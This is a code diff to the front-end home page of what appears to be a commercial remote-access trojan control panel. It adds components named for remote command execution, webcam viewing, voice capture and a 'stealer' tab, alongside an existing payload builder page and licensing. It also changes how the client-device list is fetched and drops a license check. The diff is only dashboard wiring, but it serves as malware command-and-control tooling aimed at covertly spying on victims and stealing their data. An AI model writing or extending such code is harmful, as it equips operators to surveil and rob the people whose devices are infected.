@@ -11,6 +11,14 @@ import { AdminPage } from "@/components/admin-page"
 import { BuilderPage } from "@/components/builder-page"
 import { AuthPage } from "@/components/auth-page"
 import { AdminKeysPage } from "@/components/admin-keys-page"
+import { WelcomePage } from "@/components/welcome-page"
+import { DesignPage } from "@/components/design-page"
+import { RemoteCmdTab } from "@/components/remote-cmd-tab"
+import { WebcamViewer } from "@/components/webcam-viewer"
+import { VoiceChatTab } from "@/components/voice-chat-tab"
+import { StealerTab } from "@/components/stealer-tab"
+import { Footer } from "@/components/footer"
+import { UsersPage } from "@/components/users-page"
 import { hasValidLicense, type User as DBUser } from "@/lib/db"
 
 export type User = {
@@ -77,9 +85,9 @@ export default function Home() {
     loadAuthState()
   }, [])
 
-  // Fetch clients when authenticated with valid license
+  // Fetch clients when authenticated
   useEffect(() => {
-    if (!authState?.isAuthenticated || !hasValidLicense(authState.user)) {
+    if (!authState?.isAuthenticated) {
       return
     }
 
@@ -96,7 +104,7 @@ export default function Home() {
     const fetchClients = async () => {
       try {
         const uid = authState.user?.uid
-        const isAdmin = authState.user?.is_admin
+        const isAdmin = Boolean(authState.user?.isAdmin)
 
         let apiUrl = "/api/devices"
         if (uid && (!isAdmin || !showAllDevices)) {
